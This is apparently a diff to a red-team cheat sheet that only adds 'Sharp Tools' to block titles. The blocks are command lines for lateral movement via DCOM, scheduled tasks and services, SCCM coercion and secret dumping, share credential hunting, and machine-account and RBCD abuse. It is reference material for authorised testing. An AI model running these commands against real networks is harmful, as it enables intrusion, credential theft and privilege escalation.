@@ -6,7 +6,7 @@
 
 Execute a command through a DCOM method.
 
-```cmd title:"Execute command with SharpMove DCOM"
+```cmd title:"Sharp Tools Execute command with SharpMove DCOM"
 SharpMove.exe action=dcom computername=$rhost_name command="$command" method=$dcom_method amsi=true
 ```
 <!-- cheat
@@ -19,7 +19,7 @@ var dcom_method = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --heade
 
 Create and run a remote scheduled task.
 
-```cmd title:"Execute command with SharpMove Task Scheduler"
+```cmd title:"Sharp Tools Execute command with SharpMove Task Scheduler"
 SharpMove.exe action=taskscheduler computername=$rhost_name command="$command" taskname=$task_name amsi=true username=$domain\$user password=$pass
 ```
 <!-- cheat
@@ -35,7 +35,7 @@ var pass
 
 Modify and start a remote service.
 
-```cmd title:"Modify remote service with SharpMove"
+```cmd title:"Sharp Tools Modify remote service with SharpMove"
 SharpMove.exe action=modsvc computername=$rhost_name command="$command" amsi=true servicename=$service_name
 ```
 <!-- cheat
@@ -50,7 +50,7 @@ var service_name
 
 Enumerate SCCM administrative users through the SMS Provider.
 
-```powershell title:"Enumerate SCCM administrators"
+```powershell title:"Sharp Tools Enumerate SCCM administrators"
 .\SharpSCCM.exe get class-instances SMS_ADMIN
 ```
 <!-- cheat -->
@@ -59,7 +59,7 @@ Enumerate SCCM administrative users through the SMS Provider.
 
 Resolve a device resource ID for AdminService or deployment operations.
 
-```powershell title:"Get SCCM resource ID"
+```powershell title:"Sharp Tools Get SCCM resource ID"
 .\SharpSCCM.exe get resource-id -d "$computer_name"
 ```
 <!-- cheat
@@ -70,7 +70,7 @@ var computer_name
 
 Coerce SCCM client push authentication toward a relay host.
 
-```powershell title:"Invoke SCCM client push coercion"
+```powershell title:"Sharp Tools Invoke SCCM client push coercion"
 .\SharpSCCM.exe invoke client-push -mp "$mp_fqdn" -sc "$site_code" -t "$relay_host"
 ```
 <!-- cheat
@@ -83,7 +83,7 @@ var relay_host
 
 Trigger execution against a device resource.
 
-```powershell title:"Trigger SCCM execution"
+```powershell title:"Sharp Tools Trigger SCCM execution"
 .\SharpSCCM.exe exec -rid $resource_id -r "$target"
 ```
 <!-- cheat
@@ -95,7 +95,7 @@ var target
 
 Dump locally stored SCCM secrets from disk.
 
-```powershell title:"Dump local SCCM disk secrets"
+```powershell title:"Sharp Tools Dump local SCCM disk secrets"
 .\SharpSCCM.exe local secrets disk
 ```
 <!-- cheat -->
@@ -106,7 +106,7 @@ Dump locally stored SCCM secrets from disk.
 
 Search domain shares for sensitive files and likely credential material.
 
-```powershell title:"Hunt domain shares with Snaffler"
+```powershell title:"Sharp Tools Hunt domain shares with Snaffler"
 .\Snaffler.exe -d "$domain" -c -s
 ```
 <!-- cheat
@@ -117,7 +117,7 @@ var domain
 
 Search a provided host list.
 
-```powershell title:"Hunt host list with Snaffler"
+```powershell title:"Sharp Tools Hunt host list with Snaffler"
 .\Snaffler.exe -n "$hosts" -s
 ```
 <!-- cheat
@@ -128,7 +128,7 @@ var hosts
 
 Search a specific share or directory path.
 
-```powershell title:"Hunt a specific path with Snaffler"
+```powershell title:"Sharp Tools Hunt a specific path with Snaffler"
 .\Snaffler.exe -i "$path" -s
 ```
 <!-- cheat
@@ -141,7 +141,7 @@ var path
 
 Read the domain MachineAccountQuota value.
 
-```cmd title:"Read MachineAccountQuota with StandIn"
+```cmd title:"Sharp Tools Read MachineAccountQuota with StandIn"
 StandIn.exe --object ms-DS-MachineAccountQuota=*
 ```
 <!-- cheat -->
@@ -150,7 +150,7 @@ StandIn.exe --object ms-DS-MachineAccountQuota=*
 
 Create a machine account for RBCD or shadow credential chains.
 
-```cmd title:"Add machine account with StandIn"
+```cmd title:"Sharp Tools Add machine account with StandIn"
 StandIn.exe --computer "$computer_name" --make --password "$computer_pass"
 ```
 <!-- cheat
@@ -162,7 +162,7 @@ var computer_pass
 
 Configure RBCD from a controlled computer to a target computer.
 
-```cmd title:"Set RBCD with StandIn"
+```cmd title:"Sharp Tools Set RBCD with StandIn"
 StandIn.exe --computer "$target_computer" --sid "$controlled_computer_sid"
 ```
 <!-- cheat
@@ -176,7 +176,7 @@ var controlled_computer_sid
 
 Query a domain user with SharpView.
 
-```powershell title:"Get domain user with SharpView"
+```powershell title:"Sharp Tools Get domain user with SharpView"
 .\SharpView.exe Get-DomainUser -Identity "$user"
 ```
 <!-- cheat
@@ -187,7 +187,7 @@ var user
 
 Resolve ACLs on an AD object.
 
-```powershell title:"Get object ACL with SharpView"
+```powershell title:"Sharp Tools Get object ACL with SharpView"
 .\SharpView.exe Get-ObjectAcl -Identity "$target_object" -ResolveGUIDs
 ```
 <!-- cheat
